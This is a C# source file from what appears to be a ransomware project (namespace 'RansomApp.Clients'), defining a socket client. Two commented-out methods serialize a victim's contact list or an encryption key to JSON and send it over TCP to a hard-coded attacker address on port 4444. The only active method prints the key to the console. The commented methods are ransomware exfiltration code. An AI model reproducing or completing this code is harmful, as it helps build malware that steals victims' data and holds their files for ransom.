using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using Newtonsoft.Json;
namespace RansomApp.Clients
{
    public static class SocketClient
    {
        /* public static void Connect(List<Models.Contact> contacts)
         {
             byte[] jsonObject = new byte[255];
             string obj = JsonConvert.SerializeObject(contacts);
             Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             IPEndPoint srvIP = new IPEndPoint(IPAddress.Parse("192.168.0.2"), 4444);

             socket.Connect(srvIP);
             jsonObject = Encoding.Default.GetBytes(obj);
             socket.Send(jsonObject);
             socket.Close();

         }*/
        /*public static void Connect(string key)
        {
            byte[] jsonObject = new byte[255];
            string obj = JsonConvert.SerializeObject(key);
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint srvIP = new IPEndPoint(IPAddress.Parse("IP"), 4444);

            socket.Connect(srvIP);
            jsonObject = Encoding.Default.GetBytes(obj);
            socket.Send(jsonObject);
            socket.Close();

        }*/
        public static void Connect(string key)
        {
            Console.WriteLine(key);
        }
    }
}
